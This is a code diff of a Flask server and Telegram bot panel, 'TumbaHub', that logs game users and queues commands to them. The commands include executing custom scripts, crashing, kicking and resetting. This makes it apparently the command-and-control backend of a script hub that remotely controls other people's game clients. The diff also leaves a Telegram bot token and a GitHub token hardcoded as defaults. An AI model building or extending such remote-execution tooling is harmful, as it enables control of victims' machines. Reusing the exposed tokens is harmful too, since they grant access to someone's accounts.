@@ -3,16 +3,17 @@ import requests
 import json
 import base64 # Обязательно добавляем для работы с GitHub
 import time
+import os
 
 app = Flask(__name__)
 
 # Твои данные Телеграма
-TELEGRAM_TOKEN = '8693862606:AAEvhj2EJeSxHhaw0JopIb_oK-COEZKix1g'
-TELEGRAM_CHAT_ID = '8426928414'
+TELEGRAM_TOKEN = os.getenv('TELEGRAM_TOKEN', '8693862606:AAEvhj2EJeSxHhaw0JopIb_oK-COEZKix1g')
+TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '8426928414')
 
 # --- НАСТРОЙКИ GITHUB DB ---
 # ВАЖНО: Вставь сюда свой НОВЫЙ токен!
-GITHUB_TOKEN = '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a'
+GITHUB_TOKEN = os.getenv('GITHUB_TOKEN', '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a')
 REPO_OWNER = 'repositorykreml1n'
 REPO_NAME = 'commands'
 FILE_PATH = 'players.json'
@@ -59,6 +60,28 @@ def save_players_to_github():
         
     requests.put(url, headers=headers, json=data)
 
+# --- ХЕЛПЕРЫ ДЛЯ TELEGRAM ---
+def send_telegram_message(chat_id, text, reply_markup=None, parse_mode=None):
+    payload = {"chat_id": chat_id, "text": text}
+    if reply_markup:
+        payload["reply_markup"] = reply_markup
+    if parse_mode:
+        payload["parse_mode"] = parse_mode
+    try:
+        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json=payload, timeout=5)
+    except Exception as e:
+        print(f"Ошибка отправки сообщения: {e}")
+
+def answer_callback(callback_id, text=None, show_alert=False):
+    payload = {"callback_query_id": callback_id}
+    if text:
+        payload["text"] = text
+        payload["show_alert"] = show_alert
+    try:
+        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery", json=payload, timeout=5)
+    except Exception as e:
+        print(f"Ошибка ответа на callback: {e}")
+
 # Загружаем базу при старте сервера!
 commands_queue = load_players_from_github()
 awaiting_reason = {}
@@ -99,13 +122,7 @@ def log_user():
         ]
     }
 
-    # Отправляем сообщение вместе с кнопками (параметр reply_markup)
-    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
-                  json={
-                      "chat_id": TELEGRAM_CHAT_ID, 
-                      "text": msg,
-                      "reply_markup": keyboard
-                  })
+    send_telegram_message(TELEGRAM_CHAT_ID, msg, reply_markup=keyboard)
 
     return jsonify({"status": "success"})
 
@@ -145,15 +162,7 @@ def telegram_webhook():
                         [{"text": "🎮 Игры", "callback_data": "menu_games"}]
                     ]
                 }
-                requests.post(
-                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
-                    json={
-                        "chat_id": TELEGRAM_CHAT_ID, 
-                        "text": "🎛 **Главное меню TumbaHub**\nВыберите раздел:",
-                        "reply_markup": keyboard,
-                        "parse_mode": "Markdown"
-                    }
-                )
+                send_telegram_message(TELEGRAM_CHAT_ID, "🎛 **Главное меню TumbaHub**\nВыберите раздел:", reply_markup=keyboard, parse_mode="Markdown")
                 return jsonify({"status": "ok"})
 
             # 2. ЕСЛИ БОТ ЖДЕТ СКРИПТ (Execute)
@@ -165,10 +174,7 @@ def telegram_webhook():
                     commands_queue[target_user] = []
                 commands_queue[target_user].append(action)
                 
-                requests.post(
-                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
-                    json={"chat_id": TELEGRAM_CHAT_ID, "text": f"✅ Скрипт успешно отправлен в очередь игрока {target_user}!"}
-                )
+                send_telegram_message(TELEGRAM_CHAT_ID, f"✅ Скрипт успешно отправлен в очередь игрока {target_user}!")
                 return jsonify({"status": "ok"})
 
             # 3. ЕСЛИ БОТ ЖДЕТ ПРИЧИНУ КИКА
@@ -180,10 +186,7 @@ def telegram_webhook():
                     commands_queue[target_user] = []
                 commands_queue[target_user].append(action)
                 
-                requests.post(
-                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
-                    json={"chat_id": TELEGRAM_CHAT_ID, "text": f"✅ {target_user} кикнут с причиной:\n💬 {text}"}
-                )
+                send_telegram_message(TELEGRAM_CHAT_ID, f"✅ {target_user} кикнут с причиной:\n💬 {text}")
                 return jsonify({"status": "ok"})
 
             # 4. РУЧНОЙ ВВОД (через пробелы)
@@ -202,10 +205,7 @@ def telegram_webhook():
                 if target_user not in commands_queue:
                     commands_queue[target_user] = []
                 commands_queue[target_user].append(action)
-                requests.post(
-                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
-                    json={"chat_id": TELEGRAM_CHAT_ID, "text": f"✅ Ручная команда отправлена {target_user}"}
-                )
+                send_telegram_message(TELEGRAM_CHAT_ID, f"✅ Ручная команда отправлена {target_user}")
 
     # === БЛОК 2: ОБРАБОТКА КНОПОК ===
     if update and "callback_query" in update:
@@ -267,7 +267,6 @@ def telegram_webhook():
                             [{"text": "⚡ Execute Custom Script", "callback_data": f"execselect_{target_user}"}],
                             [{"text": "🥾 Kick", "callback_data": f"kick_{target_user}"}, {"text": "💥 Crash", "callback_data": f"crash_{target_user}"}],
                             [{"text": "💀 Reset", "callback_data": f"reset_{target_user}"}], # <--- НОВАЯ КНОПКА
-                            [{"text": "⬛ Black Screen ON", "callback_data": f"bson_{target_user}"}, {"text": "⬜ OFF", "callback_data": f"bsoff_{target_user}"}],
                             [{"text": "🔙 Назад к списку", "callback_data": "menu_players"}]
                         ]
                     }
@@ -328,20 +327,6 @@ def telegram_webhook():
                         f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                         json={"chat_id": TELEGRAM_CHAT_ID, "text": f"💀 Команда сброса (Reset) отправлена {target_user}"}
                     )
-
-                # --- ЧЕРНЫЙ ЭКРАН (ВКЛ) ---
-                elif btn_action == "bson":
-                    action = "/blackscreen_on"
-                    if target_user not in commands_queue: commands_queue[target_user] = []
-                    commands_queue[target_user].append(action)
-                    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": TELEGRAM_CHAT_ID, "text": f"⬛ Черный экран ВКЛЮЧЕН для {target_user}"})
-                    
-                # --- ЧЕРНЫЙ ЭКРАН (ВЫКЛ) ---
-                elif btn_action == "bsoff":
-                    action = "/blackscreen_off"
-                    if target_user not in commands_queue: commands_queue[target_user] = []
-                    commands_queue[target_user].append(action)
-                    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": TELEGRAM_CHAT_ID, "text": f"⬜ Черный экран ВЫКЛЮЧЕН для {target_user}"})
                 
             # Убираем часики загрузки с нажатой кнопки
             requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery", json={"callback_query_id": callback_id})
